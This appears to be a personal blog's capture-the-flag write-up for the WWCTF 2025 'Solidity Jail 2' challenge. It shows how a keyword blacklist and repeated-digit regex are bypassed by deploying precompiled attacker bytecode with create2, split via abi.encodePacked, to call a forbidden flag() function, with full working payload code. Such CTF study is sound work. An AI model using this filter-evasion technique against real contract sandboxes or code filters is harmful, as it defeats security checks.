@@ -1,0 +1,364 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Yier Lin</title>
+  <meta name="description" content="CTF writeup for WWCTF 2025: Solidity Jail 2" />
+  <link href="/assets/css/main.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+  <script src="/assets/js/math.js"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+  </script>
+</head>
+
+<body>
+  <div class="wrap">
+
+  <header class="site-header">
+    <div class="logo">
+    <h1>TBA</h1>
+    </div>
+    <nav class="navbar">
+        <a href="/index.html">Home</a>
+        <a href="/security/writeups/index.html">Writeup</a>
+    </nav>
+  </header>
+
+    <hr>
+
+    <main id="top">
+      <img class="responsive" src="/assets/img/solidityjail2.png" alt="solidityjail2.png"></img>
+
+        <section>
+        
+        <p> This is a continued version of Solidity Jail 1. Basically same scenario, same goal, but with updated blacklist:</p>
+
+        <pre><code class="language-solidity">blacklist = [ 
+ "call", 
+ "store", 
+ "load", 
+ "revert", 
+ "flag", 
+ "wwf", 
+ "transfer", 
+ "address", 
+ "this", 
+ "ext", 
+ "push", 
+ "bytes4", 
+ "keccak", 
+ "block", 
+ "tx", 
+ "origin", 
+ "gas", 
+ "fallback", 
+ "receive", 
+ "selfdestruct", 
+ "suicide" 
+]
+
+if any(banned in body for banned in blacklist): 
+ raise ValueError(f"Blacklisted string found in contract.") 
+ 
+if re.search(r"(\d)\1", body): 
+ raise ValueError("Regex check failed.")
+if any(banned in body for banned in blacklist): 
+ raise ValueError(f"Blacklisted string found in contract.") 
+ 
+if re.search(r"(\d)\1", body): 
+ raise ValueError("Regex check failed.")</code></pre>
+    <p>You can see there are many more words in the blacklist — in particular, call is blocked. Moreover, the last two lines require that no consecutive identical digits, like <code>00</code>, <code>11</code>, etc., appear in the code. This will cause us a lot of trouble, as we will see later.</p>
+
+    <p>Let’s start with some preparation. We need to read the target contract’s address, which can be done with the following:</p>
+
+    <pre><code class="language-solidity">contract Solution { 
+ function main() external returns(string){ 
+// input starts
+ return string(abi.encode(msg.sender)); 
+// inpt ends
+ } 
+}</code></pre>
+
+    <p>Here is the response from the server:</p>
+    <img class="responsive" src="/assets/img/solidityjail21.png" alt="solidityjail21.png"></img>
+
+    <p>We see the contract address is</p>
+
+    <pre><code class="language-solidity">Kq\x10\xe20\x94.\xe6%\xf7\xc6O/\x13\xe8Zxz\x18^'</code></pre>
+
+    transferring to address is <code>0x4B7110e230942EE625F7C64F2f13e85a787a185E</code>.
+
+    <p>If we cannot use call, how can we invoke a function call? The only option left is to use an interface. But the function we need to call is flag, which is also blocked. So, the idea is to deploy a contract that contains a function which calls the target's flag function. We can deploy this contract using create2 with the bytecode (which can be obtained by compiling the contract). This should hide the blacklisted word.</p>
+    
+    <p>So the draft version of the solution:</p>
+
+    <pre><code class="language-solidity">contract Solution { 
+ function main() { 
+// input start
+ IAttacker a = new Attacker(); // use create2 instead of new to insert bytecode
+ return string(a.attack()); 
+ } 
+} 
+ 
+contract IAttacker { 
+ function attack() public returns(bytes memory) {return hex"";
+// input end
+ } 
+} 
+ 
+// get the bytecode
+contract Attacker { 
+ function attack() public returns(bytes memory) { 
+ address victim = 0x4B7110e230942EE625F7C64F2f13e85a787a185E; 
+ (bool success, bytes memory data) = victim.call(abi.encodeWithSignature("flag()")); 
+ return data; 
+ } 
+}</code></pre>
+
+    <p>There is a reason we use the <code>contract</code> keyword for <code>IAttacker</code> instead of <code>interface</code>: we need to leave two closing braces <code>}</code> for the Python code to fill in.</p>
+    <p>The first step in realizing our approach is to hide the content of <code>Attacker</code> to avoid the blacklist. For example, we can compile Attacker using Remix and extract the bytecode. This gives us:</p>
+    
+    <pre><code>6080604052348015600e575f5ffd5b506102708061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80639e5faafc1461002d575b5f5ffd5b61003561004b565b60405161004291906101ca565b60405180910390f35b60605f734b7110e230942ee625f7c64f2f13e85a787a185e90505f5f8273ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f890eba68000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161010e9190610224565b5f604051808303815f865af19150503d805f8114610147576040519150601f19603f3d011682016040523d82523d5f602084013e61014c565b606091505b509150915080935050505090565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61019c8261015a565b6101a68185610164565b93506101b6818560208601610174565b6101bf81610182565b840191505092915050565b5f6020820190508181035f8301526101e28184610192565b905092915050565b5f81905092915050565b5f6101fe8261015a565b61020881856101ea565b9350610218818560208601610174565b80840191505092915050565b5f61022f82846101f4565b91508190509291505056fea264697066735822122092fb4d37c54897e1e323e428beaa7937ec25a3d18d739ab76dd591e894789ded64736f6c634300081e0033</code></pre>
+
+    So the contract shall read
+
+    <pre><code>contract Solution { 
+ function main() { 
+// input start
+ bytes memory byteCode = hex"6080604052348015600e575f5ffd5b506102708061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80639e5faafc1461002d575b5f5ffd5b61003561004b565b60405161004291906101ca565b60405180910390f35b60605f734b7110e230942ee625f7c64f2f13e85a787a185e90505f5f8273ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f890eba68000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161010e9190610224565b5f604051808303815f865af19150503d805f8114610147576040519150601f19603f3d011682016040523d82523d5f602084013e61014c565b606091505b509150915080935050505090565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61019c8261015a565b6101a68185610164565b93506101b6818560208601610174565b6101bf81610182565b840191505092915050565b5f6020820190508181035f8301526101e28184610192565b905092915050565b5f81905092915050565b5f6101fe8261015a565b61020881856101ea565b9350610218818560208601610174565b80840191505092915050565b5f61022f82846101f4565b91508190509291505056fea264697066735822122092fb4d37c54897e1e323e428beaa7937ec25a3d18d739ab76dd591e894789ded64736f6c634300081e0033"; 
+ uint256 len = byteCode.length; 
+ IAttacker a; 
+ assembly { 
+ a := create2(0, add(byteCode, 0x20), len, 0x01) 
+ } 
+ return string(a.attack()); 
+ } 
+} 
+ 
+contract IAttacker { 
+ function attack() public returns(bytes memory) {return hex"";
+// input end
+ } 
+}</code></pre>
+
+    <p>Here, <code>create2</code> can deploy a contract using its bytecode, which works the same as <code>new Attacker()</code>, but without needing to provide the source code of Attacker, since it is already encoded in the bytecode.</p>
+    <p>The next problem is that the regex check requires us not to have two identical digits consecutively. However, the bytecode clearly contains many instances of <code>00</code>, <code>11</code>, and so on.</p>
+    <p>So we need to split the bytecode first, then join them using abi.encodePacked. There are two cases: if the repeated digits occur at positions 2i and 2i+1, then we simply split the hex string, for example:</p>
+    <pre><code class="language-solidity">hex"608056621a" = abi.encodePacked(hex"608056", hex"621a")</code></pre>
+    <p>However, if the repeated digits occur at positions 2i−1 and 2i, then it is impossible to split them since they are in the same byte. So, what we do is convert them into an integer. For example:</p>
+    <pre><code class="language-solidity">hex"6080552b32" = abi.encodePacked(hex"6080", uint8(85), hex"2b32");</code></pre>
+
+    <p>The value <code>85</code> corresponds to the hex string <code>55</code>. We can use a Python script to automate this, but in the end, we can split the bytecode to avoid the regex check.</p>
+    <p>The split looks a bit scary, but the final solution for input is:</p>
+    <pre><code>contract Attacker {
+    function main() external returns(string memory) {
+// input start
+        IAttacker a;
+        bytes memory bytecode = hex"";
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"608060405234801561"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"0f575f80fd5b506102878061"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"1d5f395f"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"f3fe608060405234801561"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"0f575f80fd5b5060"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"04361061"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"29575f3560e01c80639e5faafc1461"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"2d575b5f80fd5b61"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"3561"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"4b565b60405161"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"4291906101e1565b60405180910390f35b60605f734b71"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"10e230942e"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"e625f7c64f2f13e85a787a185e90505f8173ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff16"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"6040516024016040516020818303038152906040527f890eba68"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"7bff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff1916"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"6020820180517bff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ff838183161783525050505060405161010d919061023b565b5f604051808303815f865af19150503d805f81"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"14610146576040519150601f19603f3d01"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"1682016040523d82523d5f602084013e61014b565b606091505b50915050809250505090565b5f81519050919050565b5f82825260208201905092915050565b5f5b8381"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"101561018e578082015181840152602081019050610173565b5f8484015250505050565b5f601f19601f8301"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"169050919050565b5f6101b382610157565b6101bd8185610161565b93506101cd818560208601610171565b6101d6816101"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(153)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"565b840191505092915050565b5f6020820190508181035f8301526101f981846101a9565b905092915050565b5f81905092915050565b5f61021582610157565b61021f8185610201565b93506102"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"2f818560208601610171565b80840191505092915050565b5f610246828461020b565b91508190509291505056fea2646970"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(102)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"7358"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(34)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"12"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"206c74a3a4aa"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"a2bcd0ccb362fd4d90"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"0b1c08eb"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(63+56)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"4aca0bf29c218bf8a45a"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"ad8436"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"64736f6c6343"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(hex"0814"));
+        bytecode = abi.encodePacked(bytecode, abi.encodePacked(uint8(0)));
+        bytecode = abi.encodePacked(bytecode,abi.encodePacked(uint8(51)));
+        uint256 len = bytecode.length;
+        assembly {
+            a := create2(0, add(bytecode, 0x20), len, 0x01)
+        }
+        return string(a.attack());
+    }
+}
+
+contract IAttacker {
+    function attack() public returns(bytes memory) {return hex"";
+// input end
+ }
+}</code></pre>
+    <p>We get the flag:</p>
+    <img class="responsive" src="/assets/img/solidityjail22.png" alt="solidityjail22.png"></img>
+    </section>
+
+        <footer>
+          <hr />
+          <p class="muted">© Yier Lin 2025</p>
+        </footer>
+
+    </main>
+  </div>
+
+
+
+
+  <button id="backTop" type="button" aria-label="Back to top">Back to Top ↑</button>
+
+
+  <script>
+    (function(){
+      const btn = document.getElementById('backTop');
+      const onScroll = () => {
+        if (window.scrollY > 400) btn.classList.add('show');
+        else btn.classList.remove('show');
+      };
+      window.addEventListener('scroll', onScroll, { passive: true });
+      btn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+      onScroll();
+    })();
+  </script>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <script src="/assets/js/code.js"></script>
+
+
+
+</body>
+
+</html>
